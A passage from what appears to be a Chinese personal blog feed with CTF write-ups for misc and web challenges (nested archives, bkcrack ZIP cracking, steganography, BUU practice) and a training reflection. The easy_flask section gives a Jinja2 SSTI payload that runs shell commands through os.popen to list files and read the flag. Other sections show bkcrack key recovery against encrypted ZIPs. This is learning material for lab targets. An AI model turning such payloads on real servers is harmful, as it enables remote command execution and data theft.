<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
        current_number = start_number
        <span class="keyword">while</span> <span class="literal">True</span>:
            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
                <span class="keyword">break</span>
            decoded_password = decode_password(password_filename)
            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)
            current_number += <span class="number">1</span>


<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>
<p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png" alt></p>
<h2 id="infinity"><a class="markdownIt-Anchor" href="#infinity"></a> Infinity</h2>
<p>首先看提示是不知道有什么用的</p>
<p>拿到一张png，用010查一下看到zip头</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
<p>foremost提取一下</p>
<p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p>
<p>同时注意到文件名有点可疑，留意一下，可能后续要用</p>
<p>脚本：</p>
<pre><code class="highlight plaintext">import os
import zipfile
import tarfile
import py7zr
import shutil


def extract_zip(zip_path, extract_dir):
    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;
    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
        zip_ref.extractall(extract_dir)
        return zip_ref.namelist()  # 返回解压出来的文件列表


def extract_tar(tar_path, extract_dir):
    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;
    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
        tar_ref.extractall(extract_dir)
        return tar_ref.getnames()  # 返回解压出来的文件列表


def extract_7z(archive_path, extract_dir):
    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;
    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
        archive_ref.extractall(extract_dir)
        return archive_ref.getnames()  # 返回解压出来的文件列表


def handle_compressed_file(file_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;
    if file_path.endswith(&#x27;.zip&#x27;):
        extracted_files = extract_zip(file_path, extract_dir)
    elif file_path.endswith(&#x27;.tar&#x27;):
        extracted_files = extract_tar(file_path, extract_dir)
    elif file_path.endswith(&#x27;.7z&#x27;):
        extracted_files = extract_7z(file_path, extract_dir)
    else:
        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)
        return []

    # 记录去掉后缀并连接的文件名
    with open(output_txt, &#x27;a&#x27;) as output_file:
        for file_name in extracted_files:
            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀
            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)

    return extracted_files


def process_zip(zip_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;
    # 解压当前zip文件并返回解压后的文件列表
    extracted_files = extract_zip(zip_path, extract_dir)

    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue  # 跳过目录

        # 如果解压出来的是压缩包，再进行递归处理
        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            # 解压嵌套压缩包并处理
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            # 如果是嵌套的压缩包，再递归调用
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

        else:
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if zip_path.endswith(&#x27;.zip&#x27;):
        os.remove(zip_path)


def process_tar(tar_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;
    extracted_files = extract_tar(tar_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if tar_path.endswith(&#x27;.tar&#x27;):
        os.remove(tar_path)


def process_7z(archive_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;
    extracted_files = extract_7z(archive_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if archive_path.endswith(&#x27;.7z&#x27;):
        os.remove(archive_path)


def main():
    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;

    if not os.path.exists(extract_dir):
        os.makedirs(extract_dir)

    # 开始处理压缩包
    with open(output_txt, &#x27;w&#x27;) as output_file:
        output_file.write(&quot;&quot;)
    process_zip(zip_path, extract_dir, output_txt)


if __name__ == &quot;__main__&quot;:
    main()</code></pre>
<p>再对提出来的文件名做两种处理</p>
<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        file_names = infile.readlines()

    # 去掉换行符并从后往前连接
    reversed_file_names = [name.strip() for name in reversed(file_names)]

    # 将连接后的文件名写入新文件
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)
        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名
def remove_newlines_and_connect(input_txt, output_txt):
    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        # 读取所有行并去掉换行符
        file_names = infile.read().splitlines()

    # 将文件名用空格连接
    connected_file_names = &quot;&quot;.join(file_names)

    # 将连接后的文件名写入新文件
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)
        outfile.write(connected_file_names)  # 直接写入连接后的字符串

def main():
    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
    reverse_file_names(input_txt, output1_txt)
    remove_newlines_and_connect(input_txt, output2_txt)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>
<p>根据提示BASE58-Ripple、SM4-ECB</p>
<p>先后尝试顺序的和逆序的</p>
<p>最后逆序的得到以下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
<p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p>
<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
<p>在谷歌搜图后判断出是 DataMatrix码</p>
<p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
<h2 id="音频的秘密"><a class="markdownIt-Anchor" href="#音频的秘密"></a> 音频的秘密</h2>
<p>解压得到一个wav文件</p>
<p>根据提示deepsound和弱口令</p>
<p>试一下123？</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
<p>运气比较好直接出来了</p>
<p>提取zip后发现需要密码打开</p>
<p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
<p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p>
<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
<p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p>
<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>
<p>得到flag.png</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
<p>左上角一看肯定有lsb稳了，zsteg一跑</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> WEB</h1>
<h2 id="easy_flask"><a class="markdownIt-Anchor" href="#easy_flask"></a> easy_flask</h2>
<p>根据提示想想flask,应该是SSTI漏洞</p>
<p>先试着打一下，看看有没有绕过</p>
<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
<p>直接爆了，那就ls换cat flag解决</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
]]></content>
      <tags>
        <tag>-CTF -misc -WP</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU—MISC刷题记录</title>
    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
<h2 id="0荷兰宽带泄露"><a class="markdownIt-Anchor" href="#0荷兰宽带泄露"></a> 0荷兰宽带泄露</h2>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
<h2 id="1被劫持的神秘礼物"><a class="markdownIt-Anchor" href="#1被劫持的神秘礼物"></a> 1被劫持的神秘礼物</h2>
<p>下载是一个流量文件，结合标题应该是流量劫持</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
<p>主要是HTTP流量，直接追踪流</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
<p>用<code>captfencoder</code>MD5一下结束战斗</p>
<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
<h2 id="2被偷走的文件1"><a class="markdownIt-Anchor" href="#2被偷走的文件1"></a> 2被偷走的文件1</h2>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
<h2 id="3藏藏藏"><a class="markdownIt-Anchor" href="#3藏藏藏"></a> 3藏藏藏</h2>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
<h2 id="4佛系青年"><a class="markdownIt-Anchor" href="#4佛系青年"></a> 4佛系青年</h2>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
<p>查完没有藏文件，那应该就是隐写了</p>
<p>结果没有发现隐写，感觉被骗了</p>
<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
<h2 id="5刷新过的图片"><a class="markdownIt-Anchor" href="#5刷新过的图片"></a> 5刷新过的图片</h2>
<p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
<p>成功了，打开提取的文件发现有PK头</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
<h2 id="6秘密文件"><a class="markdownIt-Anchor" href="#6秘密文件"></a> 6秘密文件</h2>
<p>附件是流量，wireshark启动！</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
<p>foremost出一下，要密码，先尝试弱密码爆破</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
<h2 id="7你猜我是个啥"><a class="markdownIt-Anchor" href="#7你猜我是个啥"></a> 7你猜我是个啥</h2>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
<p>看来是改了后缀，010先查查看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
<p>演都不演了…</p>
<h2 id="8鸡你太美"><a class="markdownIt-Anchor" href="#8鸡你太美"></a> 8鸡你太美</h2>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
<p>盯完帧没有东西，看看副本，发现已经损坏</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
<p>（这里-其实是_）</p>
<h2 id="9神奇的二维码"><a class="markdownIt-Anchor" href="#9神奇的二维码"></a> 9神奇的二维码</h2>
<p>附件是一张二维码，先扫扫看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
<blockquote>
<p>[!NOTE]</p>
<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
</blockquote>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
crc32 flag.jpg</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
<p>水平有限，还是手敲罢</p>
<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
<p>鉴定为图片纯纯的诈骗（恼</p>
<h2 id="10梅花香自苦寒来"><a class="markdownIt-Anchor" href="#10梅花香自苦寒来"></a> 10梅花香自苦寒来</h2>
<p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
<p>要画图，那么应该藏了坐标，010查一下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
<blockquote>
<p>随波逐流</p>
</blockquote>
<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
<blockquote>
<p>脚本画图</p>
</blockquote>
<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
<p>​	<code>*gnuplot*</code>绘图</p>
<p>贴个脚本先</p>
<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
    re = res.read()
    res.close()
    
with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        for j in range(0, len(tem)):
            if tem[j] == &#x27;,&#x27;:
                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()</code></pre>
<p>得到去括号，去逗号的坐标值</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
<p>贴一下ubuntu下的下载和使用方法</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
gnuplot
plot <span class="string">&quot;output.txt&quot;</span></code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
<p>可以扫出来</p>
<p>​	<em>matplotlib</em>绘图</p>
<p>把原文本去括号，用脚本跑</p>
<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
import numpy as np
with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
    re = res.read()
    res.close()

with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
    re = re.split()
    tem = &#x27;&#x27;
    for i in range(0, len(re)):
        tem = re[i]
        tem = tem.lstrip(&#x27;(&#x27;)
        tem = tem.rstrip(&#x27;)&#x27;)
        gnup.write(tem + &#x27;\n&#x27;)
    gnup.close()
x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
plt.plot(x, y, &#x27;.&#x27;)
plt.show()</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>AyaN0桑的集训阶段总结</title>
    <url>/2025/08/02/AyaN0%E6%A1%91%E7%9A%84%E9%9B%86%E8%AE%AD%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="集训总结"><a class="markdownIt-Anchor" href="#集训总结"></a> 集训总结</h1>
<p>想想一个月学了什么呢。</p>
<p>好像学了很多，好像又没学到什么。(因为NepCTF被锤烂了啊草)</p>
<p>简单的总结一下学到的东西吧。</p>
<h2 id="渗透"><a class="markdownIt-Anchor" href="#渗透"></a> 渗透</h2>
<p>学到了什么。。</p>
<p>好像就会了搭代理，扫端口，查资产</p>
<p>总之没怎么学，只有老登讲课的那几次学了点进去来着</p>
<p>八月再说吧唉…</p>
<h2 id="php时代的结束"><a class="markdownIt-Anchor" href="#php时代的结束"></a> PHP时代的结束</h2>
<p>总算把PHP的知识点补完了。虽然中途跑出来的R3CTF又把我锤烂了(想到了heredoc不知道怎么写poc…DIRECTORY_SEPARATOR是什么?我不到啊)</p>
<p>还借着补完原生类的功夫把CRLF和HTTP请求走私，发现自己对HTTP协议好像真的有点不太了解啊。。</p>
<p>但是真结束了吗?我看并非</p>
<p>以后大概还是要不断补坑的</p>
<h2 id="奇奇怪怪的其他语言"><a class="markdownIt-Anchor" href="#奇奇怪怪的其他语言"></a> 奇奇怪怪的其他语言</h2>
<p>春秋杯遇到了ruby，之后就随便学了点其他的语言</p>
<p>像Ruby,Go这些</p>
<p>Go的题目还没接触过，接触到了再深入学吧，ruby的题目少，知识点也少，倒是没太大所谓</p>
<h2 id="更多更多的框架"><a class="markdownIt-Anchor" href="#更多更多的框架"></a> 更多更多的框架</h2>
<p>PHP的Yii，没遇到过…Laravel？不认识</p>
<p>Python的sanic是什么?pyramid又是啥?</p>
<p>哎呦我，怎么什么都不知道啊🖐️😭🖐️</p>
<p>最飞舞的一集</p>
<h2 id="js苦手"><a class="markdownIt-Anchor" href="#js苦手"></a> 《JS苦手》</h2>
<p>原型链?哦会的会的</p>
<p>vm沙箱?哦应该会的会的</p>
<p>XSS?我草拟吗带着你的一堆购机吧标签给我滚出去😡</p>
<h2 id="java大时代要来力"><a class="markdownIt-Anchor" href="#java大时代要来力"></a> Java大时代要来力</h2>
<p>Nep偶遇三道Java题，拼尽全力战胜(但是说实话是签到题吧呐)</p>
<p>感觉是应该学Java了啊，毕竟Go和Ruby偶尔上桌，这位可是天天上桌</p>
<p>一听到其他师傅在研究各种冷门的神秘链子已经吓哭了。。</p>
<h2 id="你真的懂数据库吗"><a class="markdownIt-Anchor" href="#你真的懂数据库吗"></a> 你真的懂数据库吗</h2>
<p>感觉数据库好多，好像随便揪一个出来都可以出题。</p>
<p>学了一点Redis和MongoDB这种NoSQL</p>
<p>结果月末被Nep的<code>clickhouse</code>SQL注入给打爆了</p>
<p>这辈子不敢说自己会SQL注入了。</p>
<p>感觉应该就学了这些吧，一个月的时间，也不敢说自己掌握的有多深入</p>
<p>希望队内赛不会爆零吧。。也不知道老登的葫芦里卖的什么药</p>
<p>感觉自己最欠缺的应该是反序列化这块吧。链子什么的看不懂啦…</p>
<h2 id="败北的ayan0"><a class="markdownIt-Anchor" href="#败北的ayan0"></a> 败北的AyaN0</h2>
<p>忘记发布了，等到看到这个队内赛已经打完了，爆零了哈哈。。</p>
<p>强度确实不够看了，现在仔细看看自己上面列的这些东西感觉有点像笑话</p>
<p>还是太心急了吗。。真正碰到比赛才知道自己只是学了个知识点，怎么打都是一知半解，又没有自己的思路</p>
<p>唉唉，要好好反思自己，好在后续成功复现了，还是多种方法去打，不学的深入一点还真是没办法上桌的，简直是会员制餐厅里端上来的一个一个雪(难视)</p>
<p>好题目也可以多自己研究一下啊感觉(这次队内赛的题目感觉都挺好的，全是我掌握的不全面的东西。。)</p>
